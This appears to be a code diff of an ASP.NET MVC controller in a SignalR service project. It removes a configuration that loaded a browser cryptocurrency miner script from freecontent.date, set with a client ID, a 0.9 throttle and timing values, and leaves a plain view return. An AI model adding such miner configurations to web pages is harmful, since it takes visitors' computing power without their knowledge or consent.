@@ -15,23 +15,7 @@ namespace SignalRService.Controllers
         private DAL.ServiceContext db = new DAL.ServiceContext();
         public ActionResult Index()
         {
-            var baseViewModel = new ViewModels.ServiceBaseViewModel()
-            {
-                SiganlRBaseConfigurationVieModel = new ViewModels.SignalRBaseConfigurationViewModel()
-                {
-                    SinalRGroup = "serviceindex"
-                },
-                 MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
-                 {
-                     ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
-                     Throttle = "0.9",
-                     ScriptUrl = "https://www.freecontent.date./W7KS.js",
-                     StartDelayMs = 3000,
-                     ReportStatusIntervalMs = 65000
-                 }
-
-            };
-            return View("Index", baseViewModel);
+            return View("Index");
         }
 
       
